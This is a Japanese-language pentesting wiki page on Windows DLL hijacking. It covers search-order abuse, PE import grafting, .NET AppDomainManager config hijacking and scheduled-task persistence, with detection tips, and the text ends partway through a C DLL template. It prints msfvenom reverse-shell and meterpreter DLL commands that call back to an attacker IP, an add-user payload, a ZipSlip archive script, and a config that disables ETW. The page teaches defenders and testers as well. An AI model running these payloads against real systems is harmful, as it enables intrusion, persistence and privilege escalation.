# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本情報

DLL Hijacking では、信頼されたアプリケーションを操作して、悪意のある DLL を読み込ませます。この用語には、**DLL Spoofing、Injection、Side-Loading** などの手法が含まれます。主にコード実行や永続化に利用され、権限昇格に使われることは比較的まれです。ここでは権限昇格に焦点を当てていますが、目的が異なっても hijacking の手法は変わりません。

### 一般的な手法

DLL Hijacking には複数の手法があり、それぞれの有効性はアプリケーションの DLL 読み込み方法によって異なります:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: 正規の DLL を悪意のあるものに置き換える手法です。DLL Proxying を使って元の DLL の機能を維持する場合もあります。
2. **DLL Search Order Hijacking**: アプリケーションの検索順序を悪用し、正規の DLL よりも先に検索されるパスへ悪意のある DLL を配置する手法です。
3. **Phantom DLL Hijacking**: 存在しない必須 DLL だと思い込ませ、アプリケーションに読み込ませる悪意のある DLL を作成する手法です。
4. **DLL Redirection**: `%PATH%` や `.exe.manifest` / `.exe.local` ファイルなどの検索パラメーターを変更し、アプリケーションを悪意のある DLL へ誘導する手法です。
5. **WinSxS DLL Replacement**: WinSxS ディレクトリ内の正規 DLL を悪意のある DLL に置き換える手法で、DLL side-loading と関連することがよくあります。
6. **Relative Path DLL Hijacking**: コピーしたアプリケーションとともに、ユーザーが制御できるディレクトリへ悪意のある DLL を配置する手法です。Binary Proxy Execution の手法に類似しています。

アプリケーションが**独自の DLL loader**を実装している場合もあります。特権プロセスが `Libraries` や `Plugins` などの子ディレクトリを列挙し、通常の Windows DLL 検索順序とは無関係に、選択した DLL をヘルパーへ渡すことがあります。別のアカウントがそのディレクトリにファイルを作成できる場合は、調査の手がかりとして扱い、プロセスの ID、ディレクトリに実際に適用される ACL、ファイルの選択規則、そして到達可能な読み込み処理を確認してください。実行ファイルの隣に書き込み可能なディレクトリがあるだけでは、そのプロセスがそこから DLL を読み込むとは限りません。

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### インストール後の PE import grafting

従来の side-loading では、信頼された PE を変更せずに DLL の名前解決を狙います。一方、**Import grafting** では、信頼されたプログラムがすでに読み込んでいる PE を変更します。攻撃者は、攻撃者が制御する DLL を参照する import descriptor と、それに関連する lookup/IAT エントリーを追加します。Windows がその依存関係を再帰的に解決すると、追加された DLL がマッピングされ、その初期化コードがそれ以外は正規のプロセス内で実行されます。これはディスク上の PE の変更であり、実行時にライブ IAT の関数ポインターを hook に置き換える操作とは異なります。<sup>[[31]](#references)[[32]](#references)</sup>

変更対象の PE は、ユーザーや Task Scheduler が起動する実行ファイルではなく、中間にある vendor DLL の場合もあります。再利用可能な手順は次のとおりです:<sup>[[32]](#references)</sup>

1. 正規の実行ファイルとその依存ファイルを、攻撃者が制御するディレクトリにコピーします。
2. 依存ファイルの一つの import 構造を変更して悪意のある DLL を参照させる一方で、その依存ファイルに期待される exports と通常の動作は維持します。
3. 正規の実行ファイルを起動する autorun または scheduled task を設定します。loader は変更された依存ファイルをマッピングし、その後、新たに import された DLL をマッピングします。task の列挙については、[Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks) を参照してください。
4. `DllMain` で負荷の高い処理を行わないようにします。観測された loader は worker thread を作成し、そこで段階的な復号処理を続行していました。

vendor のパッケージがクリーンで、import の変更がインストール後に行われている場合、これは vendor 側の supply-chain compromise とは異なります。host EXE だけでなく、ステージングされたディレクトリ内のすべてのモジュールをトリアージしてください。依存ファイルの import リストとハッシュを正常なインストール環境のものと比較し、署名を検証し、`C:\ProgramData` のような予期しない書き込み可能な場所から起動される vendor バイナリを調査してください。そのようなディレクトリにあるコピーされた crash reporter や updater を指す scheduled task は、特に有用な手がかりです。<sup>[[32]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

従来の DLL sideloading だけが、信頼された **.NET Framework** プロセスに攻撃者のコードを読み込ませる方法ではありません。対象の実行ファイルが**managed** アプリケーションの場合、CLR は実行ファイル名に基づく**アプリケーション構成ファイル**（例: `Setup.exe.config`）も参照します。このファイルでカスタム **AppDomainManager** を定義できます。構成ファイルが EXE の隣に置かれた攻撃者のアセンブリを参照している場合、CLR は**アプリケーションの通常のコードパスより前に**そのアセンブリを読み込み、信頼されたプロセス内で実行します。<sup>[[24]](#references)</sup>

Microsoft の .NET Framework 構成スキーマによると、カスタム manager を使用するには `<appDomainManagerAssembly>` と `<appDomainManagerType>` の両方が必要です。<sup>[[16]](#references)[[17]](#references)</sup>

最小構成:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

最小限のマネージャー:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

実践的な注意点:
- これは **.NET Framework 固有**の手法です。Win32 DLL の検索順序ではなく、CLR の設定解析に依存します。
- ホストは実際に **managed EXE** である必要があります。簡易トリアージには `sigcheck -m target.exe`、`corflags target.exe`、または PE メタデータの **CLR Runtime Header** の確認を使用します。
- 設定ファイル名は実行ファイル名と完全に一致する必要があり（`<binary>.config`）、通常は **EXE と同じディレクトリ**に置かれます。
- **署名済みの Microsoft／ベンダー製バイナリ**で有用です。信頼された EXE はそのままに、悪意のある managed assembly をプロセス内で実行できます。
- すでに書き込み可能なインストーラー／更新用ディレクトリがある場合、AppDomainManager hijacking を **第1段階**として使い、その後の段階で従来型の DLL sideloading や reflective loading を利用できます。

### AppDomainManager による downloader + scheduled-task bootstrap

実践的な侵入パターンでは、信頼された managed EXE と、**小規模な bootstrapper**としてのみ動作する悪意のある `*.config` および AppDomainManager DLL を組み合わせます:<sup>[[25]](#references)</sup>

1. ユーザーが `%USERPROFILE%\Downloads` など、もっともらしい場所から署名済みの .NET インストーラーまたはアップデーターを起動します。
2. 隣接する設定ファイルにより、正規アプリのロジックが開始する**前に**、CLR が攻撃者の assembly を読み込みます。
3. 悪意のある manager は **path gate** を実行します（たとえば、ホスト EXE が `Downloads` から実行されている場合のみ処理を続け、second stage は `%LOCALAPPDATA%` から実行する場合に限って許可します）。
4. チェックに通ると、ユーザーが書き込み可能な `%LOCALAPPDATA%\PerfWatson2.exe` などのパスに実際の payload をダウンロードし、scheduled task で永続化を設定します。

この亜種が重要な理由:
- 署名済みのホスト EXE は変更されないため、メインバイナリの hash だけを調べるトリアージでは侵害を見逃すことがあります。
- 単純な **パスベースの anti-analysis** はよく使われます。ZIP／EXE／DLL の三点セットを Desktop、Temp、または sandbox のパスに移動すると、意図的に一連の処理が失敗する場合があります。
- 第1段階の AppDomainManager DLL は小さく、目立たない状態に保ち、実際の implant は後から取得できます。

このパターンでよく見られる最小限の永続化の例:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notes:
- ` /rl highest` は、そのユーザー/セッションで**利用可能な最高レベル**を意味します。それだけで SYSTEM への昇格が保証されるわけではありません。
- この手法は、従来の DLL の検索順序を悪用する hijacking というより、**.NET config の悪用による実行/永続化**に分類するほうが適切な場合がよくあります。ただし、攻撃者は両方を頻繁に組み合わせます。

検出の手掛かり:
- **ZIP の展開先**、`Downloads`、`%TEMP%`、その他のユーザーが書き込み可能なフォルダーから起動され、同じ場所に `<exe>.config` がある、署名済みの .NET 実行ファイル。
- アクションの実行先が `%LOCALAPPDATA%`、`%APPDATA%`、または `Downloads` 内にあり、名前がブラウザー/ベンダーのアップデーターに似せられた新しいスケジュール タスク。
- 別の EXE を直ちにダウンロードし、その後 `schtasks.exe` を起動する、短時間だけ実行される managed bootstrap プロセス。
- 実行ファイルのパスが想定されたユーザープロファイルのディレクトリと一致しないと、早期に終了するサンプル。

### 既存のスケジュール タスクを hijack して sideload チェーンを再実行する

永続化を調べる際は、**新しいタスクの作成**だけを探さないでください。一部の侵入グループは、正規のインストーラーが**通常のアップデーター タスク**を作成するまで待ち、その後、既存のタスク アクションを書き換えます。これにより、タスク名、作成者、トリガーがそのまま残り、ディフェンダーには見慣れたものに見えます。

再利用可能な手順:
1. 正規のソフトウェアをインストール/実行し、通常作成されるタスクを特定します。
2. タスク XML をエクスポートし、現在の `<Exec><Command>` / `<Arguments>` の値を記録します。<sup>[[23]](#references)</sup>
3. アクションだけを置き換え、ユーザーが書き込み可能なステージング ディレクトリにある**信頼されたホスト EXE**をタスクで起動します。この EXE が、実際のペイロードを sideload または AppDomain-load します。
4. 明らかに不審な永続化の痕跡を新たに作成するのではなく、同じタスク名で再登録します。

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

なぜ発見されにくいのか:
- タスク名は正規のものに見せかけることができます（例: ベンダーの updater）。
- **Task Scheduler service** が起動するため、親プロセスや祖先プロセスの検証では、`explorer.exe` ではなく、想定されるスケジューリングのプロセスチェーンが確認されることがよくあります。
- **新しいタスク名**だけを探す DFIR チームは、登録済みのタスクの実行対象が `%LOCALAPPDATA%`、`%APPDATA%`、その他の攻撃者が制御できるパスに変更されていても、見逃す可能性があります。

迅速なハンティングの手がかり:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` の XML と `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` のメタデータをベースラインと比較します。
- **ユーザーが書き込み可能なディレクトリ**から実行する、または同じ場所にある `*.config` ファイルを使って .NET EXE を起動する、**ベンダー製に見える updater task** に対してアラートを設定します。

> [!TIP]
> HTML staging、AES-CTR configs、.NET implants を DLL sideloading に組み合わせる手順については、以下のワークフローを参照してください。

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

### サービスのコマンドラインに side-loaded stage を結び付ける

side-loaded DLL が、想定される host EXE と DLL の名前以外の条件を必要とする場合があります。Mandiant は、コマンドライン引数と host executable の名前に基づいて payload の復号を制御する loader について説明しています。<sup>[[33]](#references)</sup> 後の service-backed chain では、コピーした正規の host が隣接する `mscoree.dll` を読み込みました。この DLL は `LockClrVersion` を export し、サービス引数と host executable の basename から AES-128 key を導出した後にのみ、埋め込まれた stage を復号しました。各入力は16 bytesに切り詰めるか、NUL bytesで16 bytesまでパディングされました。byte単位の key は `argument XOR embedded_key XOR executable_basename` で、その後、payload はパディングなしの AES-CBC で復号されました。host の名前を変更するか、想定された引数なしで起動すると、DLL自体は読み込まれても key が変わり、この stage は復号されません。この variant を再現または分析する際は、コマンドライン引数と basename を正確に維持してください。<sup>[[34]](#references)</sup>

これは**通常の DLL side-loading に重ねられた payload gate**であり、新たな DLL search-order rule でも、それ自体で privilege escalation を実現する手法でもありません。最終的な権限レベルはサービスの security context によって決まります。[GitHub issue/file C2 workflow](../../../generic-methodologies-and-resources/github-issues-and-repository-files-c2.md) では、後段の transport を別途説明しています。<sup>[[34]](#references)</sup>

## 見つからない DLL の発見

システム内で見つからない Dlls を特定する最も一般的な方法は、sysinternals の [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) を実行し、**次の2つのフィルターを設定する**ことです。

![Common Techniques - 見つからない Dlls の発見: システム内で見つからない Dlls を特定する最も一般的な方法は、sysinternals の procmon を実行し、次の2つのフィルターを設定することです](<../../../images/image (961).png>)

![Common Techniques - 見つからない Dlls の発見: システム内で見つからない Dlls を特定する最も一般的な方法は、sysinternals の procmon を実行し、次の2つのフィルターを設定することです](<../../../images/image (230).png>)

そして、**File System Activity** だけを表示します。

![Common Techniques - 見つからない Dlls の発見: File System Activity だけを表示します](<../../../images/image (153).png>)

**一般的に見つからない DLL**を探す場合は、これを**数秒間**実行したままにします。\
**特定の executable 内で見つからない DLL**を探す場合は、**"Process Name" "contains" `<exec name>`** などのフィルターを追加し、対象を実行してから、イベントのキャプチャを停止します。<sup>[[9]](#references)</sup>

## 見つからない DLL の悪用

privileges を昇格するには、privileged process が、書き込み可能な場所から読み込もうとする**DLL**を探します。正規の DLL があるディレクトリより先に検索されるディレクトリを制御できる場合や、要求された DLL が存在せず、検索対象のディレクトリのいずれかに書き込める場合に、この状況が発生します。

### Dll の検索順序

[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **では、Dlls がどのように読み込まれるかを詳しく確認できます。**

**Windows applications** は、**あらかじめ定義された検索パス**を特定の順序でたどって DLL を検索します。DLL hijacking は、有害な DLL をこれらのディレクトリのいずれかに戦略的に配置し、正規の DLL より先に読み込ませることで発生します。これを防ぐには、アプリケーションが必要な DLL を指定する際に、絶対パスを使用するようにします。

以下に**32-bit**システムでの **DLL search order** を示します。

1. アプリケーションが読み込まれたディレクトリ。
2. システムディレクトリ。このディレクトリのパスを取得するには、[**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 関数を使用します。(_C:\Windows\System32_)
3. 16-bit システムディレクトリ。このディレクトリのパスを取得する関数はありませんが、検索対象になります。(_C:\Windows\System_)
4. Windows ディレクトリ。このディレクトリのパスを取得するには、[**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 関数を使用します。
   1. (_C:\Windows_)
5. 現在のディレクトリ。
6. PATH 環境変数に記載されたディレクトリ。これには、**App Paths** レジストリキーで指定されたアプリケーションごとのパスは含まれない点に注意してください。DLL の検索パスを算出する際に、**App Paths** キーは使用されません。

これは、**SafeDllSearchMode** が有効な場合の**デフォルト**の検索順序です。無効にすると、現在のディレクトリが2番目に移動します。この機能を無効にするには、**HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** レジストリ値を作成して、0に設定します（デフォルトでは有効です）。

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 関数を **LOAD_WITH_ALTERED_SEARCH_PATH** を指定して呼び出した場合、検索は **LoadLibraryEx** が読み込む executable module のディレクトリから始まります。

最後に、DLLは名前ではなく絶対パスで読み込むこともできます。その場合、Windows はDLL自体についてはそのパスのみを検索します。名前で要求された dependencies には、引き続き適用される検索順序が使用されます。

検索順序を変更する方法はほかにもありますが、ここでは説明しません。

### 任意のファイル書き込みを見つからない DLL の hijack につなげる

**関連する手法:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation)。

1. **ProcMon** のフィルター（`Process Name` = 対象の EXE、`Path` ends with `.dll`、`Result` = `NAME NOT FOUND`）を使い、プロセスが検索したものの見つからなかった DLL 名を収集します。<sup>[[14]](#references)</sup>
2. バイナリが**スケジュール実行またはサービスとして実行**される場合、検索順序のエントリー #1 にあたる**アプリケーションディレクトリ**に、その名前の DLL を置くと、次回の実行時に読み込まれます。ある .NET scanner の事例では、プロセスは `C:\Program Files\dotnet\fxr\...` にある本物を読み込む前に、`C:\samples\app\` 内の `hostfxr.dll` を検索していました。
3. 任意の export を持つ payload DLL（例: reverse shell）を作成します。`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`
4. primitive が **ZipSlip-style の任意書き込み**である場合、ZIP のエントリーが展開先ディレクトリから抜け出して DLL がアプリケーションフォルダーに配置されるように作成します。

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. archiveを監視対象の受信トレイ/共有フォルダーに配置します。スケジュールされたタスクがプロセスを再起動すると、悪意のあるDLLが読み込まれ、サービスアカウントとしてコードが実行されます。

### RTL_USER_PROCESS_PARAMETERS.DllPath による sideloading の強制

新しく作成するプロセスのDLL検索パスを確実に制御する高度な方法として、ntdllのネイティブAPIでプロセスを作成する際に、RTL_USER_PROCESS_PARAMETERSのDllPathフィールドを設定できます。攻撃者が制御するディレクトリをここに指定すると、インポートしたDLLを名前で解決する対象プロセス（絶対パスを使わず、安全な読み込みフラグも使わない場合）に、そのディレクトリ内の悪意のあるDLLを読み込ませることができます。

要点
- RtlCreateProcessParametersExでプロセスパラメーターを構築し、制御下のフォルダー（例: dropper/unpackerがあるディレクトリ）を指すカスタムDllPathを指定します。
- RtlCreateUserProcessでプロセスを作成します。対象バイナリがDLLを名前で解決すると、ローダーは解決時に指定されたDllPathを参照するため、悪意のあるDLLを対象EXEと同じ場所に置かなくても、確実にsideloadingを実行できます。

注意点/制限
- これは作成される子プロセスに影響します。現在のプロセスにのみ影響するSetDllDirectoryとは異なります。
- 対象はDLLを名前でインポートするか、LoadLibraryを使う必要があります（絶対パスを使わず、LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectoriesも使わないこと）。
- KnownDLLsやハードコードされた絶対パスはhijackできません。Forwarded exportsやSxSによって優先順位が変わることがあります。

最小限のCの例（ntdll、ワイド文字列、簡略化したエラー処理）:

<details>
<summary>完全なCの例: RTL_USER_PROCESS_PARAMETERS.DllPath によるDLL sideloadingの強制</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

運用上の使用例
- 悪意のある xmllite.dll（必要な関数をエクスポートするか、正規の DLL にプロキシするもの）を DllPath ディレクトリに配置します。
- 上記の手法を使って xmllite.dll を名前で検索することが知られている署名済みバイナリを起動します。ローダーは指定された DllPath 経由でインポートを解決し、DLL をサイドロードします。

この手法は実環境で、複数段階のサイドローディングチェーンを実行するために使われていることが確認されています。最初のランチャーがヘルパー DLL をドロップし、次にその DLL が、カスタム DllPath を指定して Microsoft 署名済みのハイジャック可能なバイナリを起動し、ステージングディレクトリから攻撃者の DLL を強制的に読み込ませます。<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking via `.exe.config`

**.NET Framework** のターゲットでは、アプリケーションに隣接する **`.exe.config`** ファイルを悪用することで、メモリをパッチせずに **`Main()` より前に**サイドローディングを実行できます。Win32 DLL の検索順序だけに頼るのではなく、攻撃者は正規の .NET EXE と、悪意のある config ファイルおよび攻撃者が制御する1つ以上のアセンブリを同じ場所に配置します。

チェーンの仕組み:<sup>[[15]](#references)[[22]](#references)</sup>
1. ホスト EXE が起動し、**CLR が `<exe>.config` を読み込みます**。
2. config で **`<appDomainManagerAssembly>`** と **`<appDomainManagerType>`** を設定し、ランタイムに攻撃者が制御する `AppDomainManager` をインスタンス化させます。
3. 悪意のあるマネージャーが、信頼されたホストプロセス内で **`Main()` より前の実行**を得ます。
4. 同じ config により、CLR がローカルアセンブリ（例: `InitInstall.dll`、`Updater.dll`、`uevmonitor.dll`）を優先して解決するよう強制できます。また、インラインパッチを行わずにランタイムの検証やテレメトリを弱めることもできます。

キャンペーンで見られるパターン（正確なネスト構造はディレクティブや CLR のバージョンによって異なる場合があります）:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

有用な理由:
- **`<probing privatePath="."/>`** はアセンブリの解決先をアプリケーションディレクトリ内に保ち、そのフォルダーを予測可能な sideloading の攻撃面にします。<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** は CLR の初期化中に実行を攻撃者のコードへ移し、正規のアプリケーションロジックが実行される前にコードを実行します。<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** により、full-trust アプリが strong-name 検証エラーなしで、署名されていないアセンブリや改ざんされたアセンブリを読み込める場合があります。<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** は、新しいアセンブリへの publisher-policy リダイレクトを回避します。<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** は、ランタイムの選択をより予測可能にします。<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** は特に注目すべき設定です。implant がメモリ内で `EtwEventWrite` にパッチを当てるのではなく、設定ファイルから **CLR 自身の ETW による可視性を無効化**します。

最近のキャンペーンで見られる運用パターン:
- ステージ 1 では、`setup.exe`、`setup.exe.config`、ローカルアセンブリを配置します。
- ステージ 2 では、それらをもっともらしい **AppData update** フォルダーにコピーし、ホストの名前を `update.exe` のような名前に変更して、**scheduled task** で再起動します。
- ステージ 3 では、最終的な RAT DLL/export を読み込む前に、実行コンテキスト（たとえば、Task Scheduler からの想定される親プロセス `svchost.exe`）を確認します。

ハンティングのアイデア:
- ユーザーが書き込み可能な場所で、不審な **`.config`** ファイルが隣接している、署名済みまたは正規の **.NET 実行ファイル**。
- **`appDomainManagerAssembly`**、**`appDomainManagerType`**、**`probing privatePath="."`**、**`bypassTrustedAppStrongNames`**、または **`etwEnable enabled="false"`** を含む `.config` ファイル。
- **`%LOCALAPPDATA%`** またはアプリ固有の `\bin\update\` ディレクトリにある、名前を変更した update バイナリを再起動する scheduled task。
- scheduled task が信頼された .NET ホストを起動し、そのホストが自身のディレクトリからベンダー製ではないアセンブリを直ちに読み込む、親子プロセスの連鎖。

#### Windows のドキュメントに記載された DLL 検索順序の例外

Windows のドキュメントには、標準の DLL 検索順序に対する特定の例外が記載されています。

- **すでにメモリに読み込まれている DLL と同じ名前の DLL** に遭遇すると、システムは通常の検索を省略します。代わりにリダイレクトとマニフェストを確認し、その後、メモリ内にある DLL を使用します。**この場合、システムは DLL を検索しません**。
- 現在の Windows バージョンで **既知の DLL** として認識されている場合、システムは既知の DLL のバージョンとその依存 DLL を使用し、**検索処理を省略**します。レジストリキー **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** には、これらの既知の DLL の一覧が格納されています。
- **DLL に依存関係がある**場合、依存 DLL の検索は、最初の DLL がフルパスで特定されていたかどうかにかかわらず、依存 DLL が **モジュール名だけで指定されていた**かのように行われます。

### 権限昇格

**要件**:

- **異なる権限**（水平移動またはラテラルムーブメント）で動作する、または動作する予定の、**DLL が不足している**プロセスを特定する。
- **DLL** が検索される **ディレクトリ**への**書き込みアクセス**を確保する。この場所は、実行ファイルのディレクトリまたはシステムパス内のディレクトリである可能性があります。

これらの前提条件がデフォルトで満たされることはまれです。権限の高い実行ファイルに DLL の依存関係が不足していることは通常なく、標準ユーザーがシステムの検索パス内のディレクトリに書き込めることも通常ありません。ただし、設定に不備がある環境では、両方の条件がそろう場合があります。\
要件を満たす場合は、[UACME](https://github.com/hfiref0x/UACME) プロジェクトを確認してください。主な目的は UAC bypass ですが、特定の Windows バージョン向けの DLL-hijacking PoC が含まれており、見つかった書き込み可能なディレクトリに合わせて応用できることがあります。

次のようにして**フォルダーへの権限を確認**できます:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

また、**PATH 内のすべてのフォルダーの権限を確認します**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

また、次の方法で実行ファイルの imports と dll の exports を確認することもできます:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

For a full guide on how to **abuse DLL Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 自動化ツール

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は、system PATH 内のいずれかのフォルダに書き込み権限があるか確認します。\
この脆弱性の発見に役立つその他の自動化ツールには、**PowerSploit functions**: _Find-ProcessDLLHijack_、_Find-PathDLLHijack_、_Write-HijackDll_ があります。

### 例

悪用可能な状況を見つけた場合、悪用を成功させるために最も重要なことの一つは、**実行ファイルがその DLL からインポートするすべての関数をエクスポートする DLL を作成すること**です。いずれにせよ、DLL Hijacking は、[Medium Integrity level から High **(UAC をバイパス)**](../../authentication-credentials-uac-and-efs/index.html#uac)へ、または[ **High Integrity から SYSTEM**](../index.html#from-high-integrity-to-system)** へ昇格する**際に便利です。実行を目的とした DLL hijacking に関するこちらの調査記事で、**有効な DLL の作成方法**の例を確認できます: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**\
さらに、**次の節**では、**テンプレート**として、または**必須でない関数をエクスポートする DLL**の作成に役立つ、いくつかの**基本的な DLL のコード**を紹介します。

## **DLL の作成とコンパイル**

### **DLL Proxifying**

基本的に、**DLL proxy** は、**ロード時に悪意のあるコードを実行**しながら、**実際のライブラリにすべての呼び出しを中継する**ことで、期待どおりに**公開**および**動作**する DLL です。

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) または [**Spartacus**](https://github.com/Accenture/Spartacus) を使うと、実行ファイルを指定して proxy 化したいライブラリを選び、**proxy 化された DLL を生成**できます。または、DLL を指定して**proxy 化された DLL を生成**することもできます。

### **Meterpreter**

**rev shell を取得 (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**meterpreter (x86) を取得:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**ユーザーを作成する（x86。x64版は見つかりませんでした）：**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### 自作

多くの場合、コンパイルする DLL は**被害プロセスがインポートするすべての関数をエクスポートする必要があります**。必要なエクスポートが欠けていると、バイナリはその関数を解決できず、exploit は失敗します。

<details>
<summary>C DLL テンプレート (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
